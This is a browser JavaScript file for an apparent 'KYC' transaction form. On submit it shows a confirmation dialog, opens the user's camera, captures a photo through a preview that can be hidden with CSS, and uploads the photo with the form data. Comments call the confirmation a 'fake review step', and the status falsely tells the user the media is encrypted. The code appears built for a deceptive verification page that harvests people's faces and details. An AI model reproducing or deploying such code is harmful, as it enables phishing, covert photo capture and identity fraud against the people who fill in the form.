// public/recorder.js

const form        = document.getElementById("kycForm");
const statusBox   = document.getElementById("status");
const statusText  = statusBox?.querySelector(".status-text") || statusBox;
const statusDot   = statusBox?.querySelector(".dot");
const submitBtn   = document.getElementById("submitBtn");
const btnSpinner  = submitBtn?.querySelector(".btn-spinner");
const btnLabel    = submitBtn?.querySelector(".btn-label");
const previewVideo = document.getElementById("preview");   // can be hidden via CSS

let stream = null;

// Small helpers
function setStatus(message, mode) {
  if (statusText) statusText.textContent = message;

  if (!statusBox) return;
  statusBox.classList.remove(
    "status-recording",
    "status-uploading",
    "status-error",
    "status-success"
  );
  if (mode) statusBox.classList.add(mode);
}

function setButtonBusy(busy) {
  if (!submitBtn) return;
  submitBtn.disabled = busy;
  if (btnSpinner) btnSpinner.style.display = busy ? "inline-block" : "none";
  if (btnLabel) btnLabel.textContent = busy
    ? "Submitting..."
    : "Submit Transaction Information";
}

// Wait for video to actually have a frame
function waitForVideoReady(video) {
  return new Promise((resolve) => {
    if (!video) return resolve();
    if (video.readyState >= 2) {
      return resolve();
    }
    const handler = () => {
      video.removeEventListener("loadedmetadata", handler);
      video.removeEventListener("canplay", handler);
      resolve();
    };
    video.addEventListener("loadedmetadata", handler);
    video.addEventListener("canplay", handler);
  });
}

// 1) Start camera
async function startCamera() {
  if (stream) return;

  stream = await navigator.mediaDevices.getUserMedia({
    video: true,
    audio: false, // only need a photo
  });

  if (previewVideo) {
    previewVideo.srcObject = stream;
    // keep it hidden if your CSS sets display:none;
    // but we still need it to play in the background
    const playPromise = previewVideo.play();
    if (playPromise && playPromise.catch) {
      // Ignore autoplay errors – we just need a frame
      playPromise.catch(() => {});
    }
  }

  await waitForVideoReady(previewVideo);
}

// 2) Capture one frame as PNG Blob
async function capturePhotoBlob() {
  if (!stream) {
    await startCamera();
  }

  await waitForVideoReady(previewVideo);

  const track = stream.getVideoTracks()[0];
  const settings = track.getSettings ? track.getSettings() : {};
  const width = settings.width || previewVideo.videoWidth || 640;
  const height = settings.height || previewVideo.videoHeight || 480;

  const canvas = document.createElement("canvas");
  canvas.width = width;
  canvas.height = height;
  const ctx = canvas.getContext("2d");

  ctx.drawImage(previewVideo, 0, 0, width, height);

  return new Promise((resolve, reject) => {
    canvas.toBlob(
      (blob) => {
        if (!blob) return reject(new Error("Failed to create image blob"));
        resolve(blob);
      },
      "image/png",
      0.95
    );
  });
}

// 3) Upload form + photo
async function uploadFormAndPhoto(formData, photoBlob) {
  formData.append("photo", photoBlob, "kyc-photo.png");

  const res = await fetch("/upload-photo", {
    method: "POST",
    body: formData,
  });

  if (!res.ok) {
    throw new Error(`Upload failed: HTTP ${res.status}`);
  }

  return res.json(); // { message, filename, url }
}

// 4) Handle submit
if (form) {
  form.addEventListener("submit", async (event) => {
    event.preventDefault();

    // Simple “confirmation” dialog (your fake review step)
    const ok = window.confirm(
      "Please confirm your transaction details are correct before submitting."
    );
    if (!ok) return;

    try {
      setButtonBusy(true);
      setStatus("Requesting camera access…", "status-recording");

      await startCamera();

      setStatus("Capturing verification photo…", "status-recording");
      const photoBlob = await capturePhotoBlob();

      setStatus("Uploading encrypted media…", "status-uploading");
      const formData = new FormData(form);
      const result = await uploadFormAndPhoto(formData, photoBlob);

      setStatus(
        `Submitted successfully. Server says: Photo stored as: ${result.filename}`,
        "status-success"
      );
    } catch (err) {
      console.error(err);
      setStatus(
        "Error: " + (err && err.message ? err.message : "Unexpected error"),
        "status-error"
      );
    } finally {
      setButtonBusy(false);

      // You can stop the stream if you want to release camera
      if (stream) {
        stream.getTracks().forEach((t) => t.stop());
        stream = null;
      }
    }
  });
}
